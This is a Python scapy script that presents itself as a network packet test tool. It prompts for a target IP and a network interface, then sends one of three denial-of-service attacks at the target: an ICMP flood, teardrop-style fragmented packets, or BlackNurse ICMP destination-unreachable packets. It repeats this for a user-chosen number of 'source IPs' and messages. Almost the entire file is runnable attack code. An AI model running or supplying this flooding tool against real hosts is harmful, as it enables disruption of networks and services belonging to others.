import logging
import random
import time
import os
import sys
from scapy.all import IP, ICMP, send, conf, get_if_list, get_working_if
import warnings

# Silence warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

# Minimal payload for testing
PAYLOAD = "ping"

# Validate root
if os.geteuid() != 0:
    print("[-] Please run this script as root (use sudo).")
    sys.exit(1)

def get_user_input(prompt, valid_options=None, default=None):
    while True:
        value = input(prompt).strip()
        if not value and default is not None:
            return default
        if valid_options and value not in valid_options:
            print(f"[!] Invalid input. Valid options are: {valid_options}")
        elif value:
            return value

def get_random_ips(n):
    return [
        f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        for _ in range(int(n))
    ]

def get_ips_from_file(n, filename="ips.txt"):
    try:
        with open(filename, "r") as file:
            base_ips = [line.strip() for line in file if line.strip()]
        if not base_ips:
            print("[-] Error: ips.txt is empty.")
            sys.exit(1)
    except FileNotFoundError:
        print("[-] Error: ips.txt not found.")
        sys.exit(1)

    full_list = (base_ips * (int(n) // len(base_ips))) + base_ips[:int(n) % len(base_ips)]
    return full_list

# No spoofing for now: use local real IP (so packets are routed properly)
def send_flood(args):
    _, dst_ip, iface, count = args
    print(f"[+] Sending {count} ICMP packets to {dst_ip} on interface {iface}")
    send((IP(dst=dst_ip) / ICMP() / PAYLOAD) * count, iface=iface)

def send_teardrop(args):
    _, dst_ip, iface, count = args
    print(f"[+] Sending teardrop-like packets to {dst_ip}")
    send((IP(dst=dst_ip, flags="MF", proto=17, frag=0) / ICMP() / PAYLOAD) * count, iface=iface)

def send_blacknurse(args):
    _, dst_ip, iface, count = args
    print(f"[+] Sending BlackNurse packets to {dst_ip}")
    send((IP(dst=dst_ip) / ICMP(type=3, code=3)) * count, iface=iface)

def main():
    print("=== Network Packet Test Tool ===")

    dst_ip = get_user_input("Target IP address: ")
    n_ips = int(get_user_input("Number of logical source IPs (not spoofed): "))
    n_msg = int(get_user_input("Messages per IP: "))

    print("\nAvailable Interfaces:")
    for iface in get_if_list():
        print(f"- {iface}")
    iface = get_user_input(f"Interface to use [default: auto-detect]: ", default=get_working_if())

    print("\nSelect attack type:")
    print("1) Flood\n2) Teardrop\n3) Black Nurse")
    attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])

    print("\nSource IPs:")
    print("1) From ips.txt\n2) Randomly generated (not spoofed)")
    origin_type = get_user_input("Your choice (1/2): ", valid_options=["1", "2"])

    if origin_type == "1":
        ips = get_ips_from_file(n_ips)
    else:
        ips = get_random_ips(n_ips)

    args_list = [(ip, dst_ip, iface, n_msg) for ip in ips]

    print(f"\n[+] Sending packets to {dst_ip} using interface {iface}...\n")

    start_time = time.time()

    try:
        for args in args_list:
            if attack_type == "1":
                send_flood(args)
            elif attack_type == "2":
                send_teardrop(args)
            elif attack_type == "3":
                send_blacknurse(args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    duration = time.time() - start_time
    total_packets = n_ips * n_msg
    speed = total_packets / duration if duration > 0 else 0

    print("\n=== Simulation Complete ===")
    print(f"Time elapsed: {duration:.2f} seconds")
    print(f"Total packets sent: {total_packets}")
    print(f"Approx. speed: {speed:.2f} packets/sec")

if __name__ == "__main__":
    main()
